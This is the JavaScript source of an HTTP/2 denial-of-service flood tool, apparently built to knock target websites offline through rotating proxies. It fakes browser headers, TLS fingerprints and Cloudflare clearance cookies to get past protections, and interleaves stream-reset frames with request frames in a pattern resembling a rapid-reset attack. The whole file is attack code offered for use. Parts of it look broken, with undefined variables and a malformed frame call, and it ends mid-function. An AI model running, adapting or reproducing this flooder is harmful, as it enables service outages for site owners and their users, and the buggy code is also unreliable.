const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();

const Buffer = require('buffer').Buffer;

const RATE_LIMIT_THRESHOLD = 3; 
const SESSION_ROTATE_REQUESTS = 35; 
const PROXY_COOLDOWN = 45000; 
const REQUEST_DELAY_MIN = 20; 
const REQUEST_DELAY_MAX = 60; 

const errorHandler = error => {
	if (['ECONNRESET', 'ETIMEDOUT', 'ECONNREFUSED', 'EHOSTUNREACH', 'ERR_HTTP2_STREAM_ERROR'].includes(error.code)) {
		return; // Silently ignore common network errors
	}
	// console.error('[Worker Error]', error); // Optional: Log other errors
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 5);
    frame.writeUInt32BE(streamId, 7);
    if (payload.length > 0) frame.set(payload, 10);
    return frame;
}
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(11 + offset, 11 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
const cipherList = [
	'TLS_AES_128_GCM_SHA256',
	'TLS_AES_256_GCM_SHA384',
	'TLS_CHACHA20_POLY1305_SHA256',
	'ECDHE-ECDSA-AES128-GCM-SHA256',
	'ECDHE-RSA-AES128-GCM-SHA256',
	'ECDHE-ECDSA-AES256-GCM-SHA384',
	'ECDHE-RSA-AES256-GCM-SHA384'
];
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cipherList[Math.floor(Math.random() * cipherList.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!target) {
	console.error('Missing target URL');
	process.exit(1);
}
if (!time) {
	console.error('Missing time');
	process.exit(1);
}
if (!thread) {
	console.error('Missing thread count');
	process.exit(1);
}
if (!proxyFile) {
	console.error('Missing proxy file');
	process.exit(1);
}
if (!rps || rps <= 0) {
	console.error('Invalid rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 100;
const RESTART_DELAY = 1;
if (cluster.isMaster) {
  console.log("@CRISXTOP".bgRed);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= thread; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 90000);
	setTimeout(() => process.exit(-1), time * 10000);
} else {
    // Worker process
    const baseInterval = 4; // ms, original interval for flood execution
    let floodInterval = baseInterval;

    // Make workers with odd IDs less frequent
    if (cluster.worker.id % 2 !== 0) {
        // Increase interval proportionally to reduce average rate (e.g., to ~70%)
        floodInterval = Math.max(baseInterval + 1, Math.floor(baseInterval / 0.7));
        // console.log(`Worker ${cluster.worker.id}: Using flood interval ${floodInterval}ms`); // Optional: Log the adjusted interval
    } else {
        // console.log(`Worker ${cluster.worker.id}: Using flood interval ${floodInterval}ms`); // Optional: Log the base interval
    }

    setInterval(function() {
        flood(); // flood() still uses the original 'rps' from argv for burst size per execution
    }, floodInterval);
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyFile.split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 5)) + min;
}
   
           nodeii = getRandomInt(115,124)
           cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
           const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
           const headers = {
    ":method": "GET",
    ":authority": parsed.host,
    ":scheme": "https",
    ":path": parsed.path,
    ...shuffleObject({
    "sec-ch-ua": `\\\"Not)B;Brand\\\";v=\\\"${getRandomInt(100, 99999)}\\\", \\\"Google Chrome\\\";v=\\\"${nodeii}\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\"`,
    "Pragma" : "no-cache",
    ...(Math.random() < 0.4 ? { "cache-control": cache[Math.floor(Math.random() * cache.length)]} : {}),
    ...(Math.random() < 0.8 ? { "sec-ch-ua-mobile": "?0"} : {}),
    "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
    "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
    "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
     ...(Math.random() < 0.3 ?{"polion-sec-cf": "GAY-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.6 ?{[generateRandomString(1, 2)+"-night-thef-"+generateRandomString(1, 2)]: "zffs-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.6 ?{["accept-client-"+generateRandomString(1, 2)]: "router-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.3 ?{"Crisx-Sec-HOPEFULL": "zeus-bff"}:{}),
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, cdnfly",
    "sec-ch-ua-platform": "Fake-Windows" + "="+ generateRandomString(1, 4)+ "?"+ generateRandomString(5, 30),
     }),
    "user-agent": process.argv[8],
    "cookie": process.argv[7],
    ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
    "accept-language": "ru,en-US;q=0.9,en;q=0.8"
}

        

	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 500000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 50000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
		, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
    ,}
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, minVersion: 'TLSv1.2'
    ,maxVersion: 'TLSv1.3'
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
    ,maxRedirects: 50
    ,followAllRedirects: true
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
async function generateJA3Fingerprint(socket) {
    if (!socket.getCipher()) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();
    const tlsVersion = supportedVersions.split('/')[0];

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${tlsVersion}:${cipherInfo.bits}`;
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    
 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        headers['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
    let clasq = shuffleObject({
    ...(Math.random() < 0.5 ? { headerTableSize: 655362 } : {}),
    ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
    enablePush: false,
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
    ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
    ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
});

function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
    return clasq;
}
setInterval(() => {
    incrementClasqValues();
    const payload = Buffer.from(JSON.stringify(clasq));
    const frames = encodeFrame(0, 4, payload, 0);
}, 10000);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: incrementClasqValues(),
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 40000,
    "maxSessionMemory": 200,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            const requests1 = [];
            let count = 0;
            let streamId =1;
            let streamIdReset = 0;
            let currenthead = 0;
			const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
      
      const headers2 = (currenthead) => {
                let updatedHeaders = {};
                currenthead += 1;
            
                switch (currenthead) {
                    case 1:
                        updatedHeaders["sec-ch-ua"] = `${randomString}`;
                        break;
                    case 2:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = `${randomString}`;
                        break;
                    case 3:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `${randomString}`;
                        break;
                    case 4:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = `${randomString}`;
                        break;
                    case 5:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        break;
                    case 6:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = `${randomString}`;
                        break;
                    case 7:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = `${randomString}`;
                        break;
                    case 8:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = `${randomString}`;
                        break;
                    case 9:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = `${randomString}`;
                        break;
                    case 10:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = `${randomString}`;
                        break;
                    case 11:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = "document";
                        updatedHeaders["accept-encoding"] = `${randomString}`;
                        break;
                    case 12:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = "document";
                        updatedHeaders["accept-encoding"] = "gzip, deflate, br, zstd";
                        break;
                    default:
                        break;
                }
            
                return updatedHeaders;
            };
            
            if (streamId >= Math.floor(rps / 5)) {
                let updatedHeaders = headers2(currenthead);
                
                Object.entries(updatedHeaders).forEach(([key, value]) => {
                    if (!headers.some(h => h[0] === key.trim())) {
                        headers.push([key.trim(), value.trim()]);
                    }
                 });
            }
            const updatedHeaders = headers2(currenthead);
                let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                const head = {
                    ...dynHeaders,
                    ...headers,
                    ...updatedHeaders,
                };
                
                            
                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
                for (let i = 0; i < rps; i++) {
                 const priorityWeight = Math.floor(Math.random() * 256); 
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                                                weight: priorityWeight,
                                                parent:0,
                                                exclusive: true,
						                        endStream: true,
                                                dependsOn: 0,
                                               
                                            });
                                            req.setEncoding('utf8');
                                            let data = 0;
                                            req.on('data', (chunk) => {
                                            data += chunk;
                                            });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve(data);
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([
                                                encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                                frame
                                                
                                                
                                            ]));
                                        } else if (streamIdReset >= 2 && (streamIdReset -2) % 4 === 0) {
                       tlsSocket.write(Buffer.concat([encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),frames
                            
                                        ]));
                            } 
                                        streamIdReset+= 2;
                                        streamId += 2;
                                        data +=2;
                requests.push({ requestPromise, frame });
                
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
            const requestPromise2 = new Promise((resolve, reject) => {
                const request2 = client.request(head, {
                    priority: 1,
                    weight: priorityWeight,
                    parent: 0,
                    exclusive: true,
                });
                request2.setEncoding('utf8');
                let data2 = Buffer.alloc(0);

                request2.on('data', (chunk) => {
                    data2 += chunk;
                });

                request2.on('response', (res2) => {
                    request2.close(http2.constants.NO_ERROR);
                        request2.destroy();
                    resolve(data2);
                });

                request2.on('end', () => {
                    count++;
                    if (count === time * rps) {
                        clearInterval(intervalId);
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count === rps) {
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.destroy();
                        clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                });

                request2.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
            });

            requests1.push({ requestPromise: requestPromise2, frame });
            await Promise.all(requests1.map(({ requestPromise }) => requestPromise));
           
        }, 500);
    });
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//

class Session {
    constructor(proxy) {
        this.proxy = proxy;
        this.cookies = new Map();
        this.cf_clearance = '';
        this.lastRequest = Date.now();
        this.requestCount = 0;
        this.successCount = 0;
        this.failCount = 0;
        this.rateLimitCount = 0;
        this.lastStatusCode = 0;
        this.rateLimit = {
            remaining: 50,
            reset: Date.now() + 60000
        };
        this.fp = browserFPs[Math.floor(Math.random() * browserFPs.length)];
        this.lastConnectTime = 0;
        this.requestDelays = new Map();
        this.lastPathTime = new Map();
        this.pathCount = new Map();
    }

    updateCookies(headers) {
        const cookies = headers['set-cookie'];
        if (cookies) {
            cookies.forEach(cookie => {
                const parts = cookie.split(';')[0].split('=');
                if (parts.length === 2) {
                    const [name, value] = parts;
                    this.cookies.set(name.trim(), value.trim());
                    if (name.trim() === 'cf_clearance') {
                        this.cf_clearance = value.trim();
                    }
                }
            });
        }

        if (headers['cf-ratelimit-remaining']) {
            this.rateLimit.remaining = parseInt(headers['cf-ratelimit-remaining']);
        }
        if (headers['cf-ratelimit-reset']) {
            this.rateLimit.reset = Date.now() + (parseInt(headers['cf-ratelimit-reset']) * 1000);
        }
    }

    getCookieHeader() {
        return Array.from(this.cookies.entries())
            .map(([name, value]) => `${name}=${value}`)
            .join('; ');
    }

    shouldRotateSession() {
        const timeSinceLastRequest = Date.now() - this.lastRequest;
        return this.requestCount >= SESSION_ROTATE_REQUESTS || 
               timeSinceLastRequest > 60000 ||
               this.failCount >= 3 ||
               this.rateLimitCount >= RATE_LIMIT_THRESHOLD ||
               (this.rateLimit.remaining < 5 && Date.now() < this.rateLimit.reset);
    }

    updateStats(statusCode, path) {
        this.lastStatusCode = statusCode;
        const now = Date.now();

        if (!this.pathCount.has(path)) {
            this.pathCount.set(path, 0);
            this.lastPathTime.set(path, now);
        }
        this.pathCount.set(path, this.pathCount.get(path) + 1);

        const lastTime = this.lastPathTime.get(path);
        const delay = now - lastTime;
        this.requestDelays.set(path, delay);
        this.lastPathTime.set(path, now);

        if (statusCode >= 200 && statusCode < 400) {
            this.successCount++;
            this.failCount = Math.max(0, this.failCount - 1);
            if (this.rateLimitCount > 0) this.rateLimitCount--;
        } else {
            this.failCount++;
            if (statusCode === 429) {
                this.rateLimitCount++;
            }
        }
        this.lastRequest = now;
        this.requestCount++;
    }

    getOptimalDelay(path) {
        const baseDelay = Math.floor(Math.random() * (REQUEST_DELAY_MAX - REQUEST_DELAY_MIN) + REQUEST_DELAY_MIN);
        const pathCount = this.pathCount.get(path) || 0;
        const lastDelay = this.requestDelays.get(path) || 0;
        
        if (pathCount > 10 && lastDelay < 100) {
